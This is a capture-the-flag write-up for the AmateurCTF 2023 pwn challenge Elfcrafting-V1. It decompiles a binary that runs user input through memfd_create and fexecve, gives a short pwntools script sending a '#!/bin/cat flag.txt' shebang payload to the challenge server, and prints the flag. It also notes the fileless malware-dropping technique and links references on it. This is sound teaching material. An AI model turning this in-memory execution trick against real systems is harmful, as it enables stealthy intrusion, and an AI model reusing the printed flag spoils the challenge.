---
title: AmateurCTF '23 - Pwn - Elfcrafting-V1
date: '2023-07-18'
tags: ['ctf', 'pwn', 'amateurctf', 'amateurctf23', 'writeup', 'elf', 'elfcrafting-v1', 'memfd_create', 'fexecve']
draft: false
summary: Sending a shebang to let fexecve execute a command for us and get the flag.
---

## Challenge Description

How well do you understand the ELF file format?

Author: unvariant

Connection info: `nc amt.rs 31178`

## Solution

We were provided with a binary and a libc file. Let's first analyze the binary using `checksec` and `file`:

![chal](/static/writeups/amateurctf2023/pwn/ec1.png)

Now, let's analyze this binary in ghidra and find all the functions

![chal](/static/writeups/amateurctf2023/pwn/ec1-1.png)

Well, there's only the main function. I've cleaned up the code in ghidra:

```c:main
int main(int param_1,char **param_2,char **param_3) {
  int fd;
  ulong ret;
  long in_FS_OFFSET;
  char buffer [40];
  long canary;
  
  canary = *(long *)(in_FS_OFFSET + 0x28);
  setbuf(stdout,(char *)0x0);
  setbuf(stderr,(char *)0x0);
  puts("I\'m sure you all enjoy doing shellcode golf problems.");
  puts("But have you ever tried ELF golfing?");
  puts("Have fun!");
  fd = memfd_create("golf",0);
  if (fd < 0) {
    perror("failed to execute fd = memfd_create(\"golf\", 0)");
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  ret = read(0,buffer,32);
  if ((int)ret < 0) {
    perror("failed to execute ok = read(0, buffer, 32)");
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  printf("read %d bytes from stdin\n",ret & 0xffffffff);
  ret = write(fd,buffer,(long)(int)ret);
  if ((int)ret < 0) {
    perror("failed to execute ok = write(fd, buffer, ok)");
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  printf("wrote %d bytes to file\n",ret & 0xffffffff);
  fd = fexecve(fd,param_2,param_3);
  if (fd < 0) {
    perror("failed to execute fexecve(fd, argv, envp)");
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  if (canary != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}
```

This code consists of two functions that I had of heard of before during my malware analysis days and were always deemed pretty `sus`.

- memfd_create
- fexecve

According to the man page's of both:

> memfd_create() creates an anonymous file and returns a file descriptor that refers to it. The file behaves like a regular file, and so can be modified, truncated, memory-mapped, and so on. However, unlike a regular file, it lives in RAM and has a volatile backing storage. Once all references to the file are dropped, it is automatically released.

> fexecve() executes the program referred to by the file descriptor fd with command-line arguments in argv, and with environment variables in envp. The file descriptor fd must refer to an open file. The file offset of the open file is set to the beginning of the file (see lseek(2)) before fexecve() loads the program, so that the program sees the file contents as if reading from the file for the first time.

So, we can see that `memfd_create` creates a file in memory and `fexecve` executes a program with the file descriptor as the first argument. This means that we can create a file in memory and then execute it using `fexecve`. This concept is often used in malware's to execute shellcode in memory and for `stealthy` dropping. There are a lot of posts explaining the concept in detail, I'll link some of them at the end of the [writeup](#references).

Now, the main caveat is, what ever's being written to `golf` fd, is being read from the user, so we control it. The buffer is `32` bytes long meaning we can simply try and pass something into it and it will work. So, let's try and pass a simple `/bin/bash` into it and see what happens:

![chal](/static/writeups/amateurctf2023/pwn/ec1-2.png)

Well, we can see that it's trying to execute the literal string `/bin/bash` which obviously won't work and hence gives the `exec format error` error. So, the fix? We need to pass a `shebang` into the file descriptor as that literal string will actually execute the command that we're trying to execute.

> Shebang is the character sequence consisting of the characters number sign and exclamation mark (#!) at the beginning of a script. It is also called sha-bang, hashbang, pound-bang, or hash-pling.

So, let's try and pass a bash-shebang into the file descriptor and see what happens:

![chal](/static/writeups/amateurctf2023/pwn/ec1-3.png)

Okay, so this proves that we were successful in executing the command. Now, let's try and run `cat` and get the flag:

![chal](/static/writeups/amateurctf2023/pwn/ec1-4.png)

Well, that was pretty straight forward. Let's connect to the remote and get the flag

![chal](/static/writeups/amateurctf2023/pwn/ec1-5.png)

Writing a basic `exploit.py` for this:

```python:exploit.py
from pwn import *
import re

io = remote('amt.rs', 31178)
io.sendlineafter(b"fun!\n", b"#!/bin/cat flag.txt")
buf = io.recvall().decode()
flag = re.findall('amateursCTF{.*?}', buf)[0]
info(f"Flag: {flag}")
```

![chal](/static/writeups/amateurctf2023/pwn/ec1-6.png)

And, we get the flag:
`amateursCTF{i_th1nk_i_f0rg0t_about_sh3bangs_aaaaaargh}`

> NOTE: The challenge heavily used the word `golf` which relates to `binary-golfing`, we'll look into that in elfcrafting-v2

## References

[Linux-Based-IPC-Injection](https://www.aon.com/cyber-solutions/aon_cyber_labs/linux-based-inter-process-code-injection-without-ptrace2/)

[In-Memory-ELF-Execution](https://magisterquis.github.io/2018/03/31/in-memory-only-elf-execution.html)

[Super-Stealthy-Droppers](https://0x00sec.org/t/super-stealthy-droppers/3715)

[Stackoverflow-Question](https://stackoverflow.com/questions/63208333/using-memfd-create-and-fexecve-to-run-elf-from-memory)